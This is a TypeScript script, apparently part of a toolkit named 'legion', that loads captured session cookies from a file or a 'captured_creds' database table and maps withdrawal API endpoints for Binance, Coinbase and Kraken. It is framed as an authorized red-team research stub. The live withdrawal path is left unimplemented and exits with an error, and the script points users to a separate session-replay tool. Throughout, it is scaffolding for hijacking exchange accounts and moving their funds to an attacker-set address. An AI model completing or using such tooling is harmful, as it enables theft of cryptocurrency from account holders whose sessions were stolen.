/**
 * CEX auto-withdraw — EXPERIMENTAL / HIGH RISK (authorized red-team only).
 *
 * Uses captured session cookies to attempt API withdrawal flows.
 * Most exchanges require additional 2FA, email confirmation, or whitelisted addresses.
 * This script is a **research stub** — it validates session state and documents
 * withdrawal endpoints; it does NOT execute real withdrawals unless
 * CEX_AUTO_WITHDRAW_ENABLED=true is explicitly set in the environment.
 *
 * Usage:
 *   pnpm cex-auto-withdraw --id <uuid> --dry-run
 *   pnpm cex-auto-withdraw --cookies capture.json --exchange binance --dry-run
 */
import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
import { readFile } from 'node:fs/promises'
import path from 'node:path'
import type { Pool } from 'pg'

import {
  parseSessionCaptureFile,
  type SessionCaptureFile,
} from './lib/session-cookie-utils.js'

const WITHDRAWAL_ENDPOINTS: Record<string, string> = {
  binance: 'https://www.binance.com/bapi/capital/v1/private/capital/withdraw/apply',
  coinbase: 'https://www.coinbase.com/api/v3/brokerage/cfm/withdraw',
  kraken: 'https://www.kraken.com/0/private/Withdraw',
}

type CredRow = {
  id: string
  exchange: string
  username: string
  session_cookies: string | null
}

function fail(msg: string): never {
  console.error(`[cex-auto-withdraw] ${msg}`)
  process.exit(1)
}

function readArg(flag: string): string | undefined {
  const idx = process.argv.indexOf(flag)
  return idx !== -1 ? process.argv[idx + 1]?.trim() : undefined
}

function hasFlag(flag: string): boolean {
  return process.argv.includes(flag)
}

function isAutoWithdrawEnabled(): boolean {
  const v = process.env['CEX_AUTO_WITHDRAW_ENABLED']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

function getPool(): Pool {
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) fail('DATABASE_URL not configured')
  return createDatabaseAnchorPool(url.trim(), { max: 3, connectionTimeoutMillis: 10_000 })
}

async function loadCapture(opts: {
  id?: string
  cookiesFile?: string
  exchange?: string
}): Promise<{ exchange: string; capture: SessionCaptureFile }> {
  if (opts.cookiesFile) {
    const raw = JSON.parse(await readFile(path.resolve(opts.cookiesFile), 'utf8')) as unknown
    const capture = parseSessionCaptureFile(raw)
    const exchange =
      opts.exchange?.trim() ||
      capture.exchange?.trim() ||
      (capture.url ? new URL(capture.url).hostname.replace(/^www\./, '').split('.')[0] : '')
    if (!exchange) fail('Pass --exchange when capture JSON has no exchange field')
    return { exchange, capture }
  }

  if (!opts.id) fail('Pass --id <uuid> or --cookies <file.json>')
  const pool = getPool()
  try {
    const result = await pool.query(
      `SELECT id, exchange, username, session_cookies FROM captured_creds WHERE id = $1::uuid`,
      [opts.id],
    )
    const row = result.rows[0] as CredRow | undefined
    if (!row) fail(`Credential not found: ${opts.id}`)
    if (!row.session_cookies) fail('No session cookies on this record')
    return {
      exchange: row.exchange,
      capture: {
        exchange: row.exchange,
        username: row.username,
        session_cookies: row.session_cookies,
      },
    }
  } finally {
    await pool.end().catch(() => {})
  }
}

async function probeSession(
  exchange: string,
  capture: SessionCaptureFile,
  dryRun: boolean,
): Promise<void> {
  const endpoint = WITHDRAWAL_ENDPOINTS[exchange.toLowerCase()]
  const cookieHeader = capture.session_cookies?.trim()
  if (!cookieHeader) fail('No session cookies in capture')

  console.info(`[cex-auto-withdraw] Exchange: ${exchange}`)
  console.info(`[cex-auto-withdraw] User: ${capture.username ?? '(unknown)'}`)
  console.info(`[cex-auto-withdraw] Withdrawal endpoint: ${endpoint ?? '(unknown — manual research required)'}`)
  console.info(`[cex-auto-withdraw] Cookie length: ${cookieHeader.length} chars`)

  if (dryRun || !isAutoWithdrawEnabled()) {
    console.warn('')
    console.warn('[cex-auto-withdraw] ⚠️  DRY RUN — no withdrawal submitted.')
    console.warn('[cex-auto-withdraw] Real withdrawals require:')
    console.warn('  1. CEX_AUTO_WITHDRAW_ENABLED=true in .env')
    console.warn('  2. Written authorization + legal scope for the target exchange')
    console.warn('  3. Whitelisted destination address configured via CEX_WITHDRAW_ADDRESS')
    console.warn('  4. Active session without additional 2FA/email confirmation')
    console.warn('')
    console.warn('[cex-auto-withdraw] Recommended flow: pnpm session-replay --export-db --id <uuid> --launch')
    return
  }

  const dest = process.env['CEX_WITHDRAW_ADDRESS']?.trim()
  if (!dest) fail('CEX_WITHDRAW_ADDRESS not set')

  if (!endpoint) fail(`No withdrawal endpoint mapped for exchange: ${exchange}`)

  console.error('[cex-auto-withdraw] CEX_AUTO_WITHDRAW_ENABLED=true — live withdrawal NOT implemented.')
  console.error('[cex-auto-withdraw] Implement exchange-specific signed API calls in a scoped lab fork only.')
  fail('Live auto-withdraw blocked — use session-replay for manual authorized testing')
}

async function main(): Promise<void> {
  const id = readArg('--id')
  const cookiesFile = readArg('--cookies')
  const exchange = readArg('--exchange')
  const dryRun = hasFlag('--dry-run') || !isAutoWithdrawEnabled()

  if (!id && !cookiesFile) {
    fail(
      'Usage:\n' +
        '  pnpm cex-auto-withdraw --id <uuid> --dry-run\n' +
        '  pnpm cex-auto-withdraw --cookies capture.json --exchange binance --dry-run\n' +
        '\n⚠️  EXPERIMENTAL — see script header for risk disclosure.',
    )
  }

  const { exchange: resolvedExchange, capture } = await loadCapture({ id, cookiesFile, exchange })
  await probeSession(resolvedExchange, capture, dryRun)
}

main().catch((e) => fail(e instanceof Error ? e.message : String(e)))
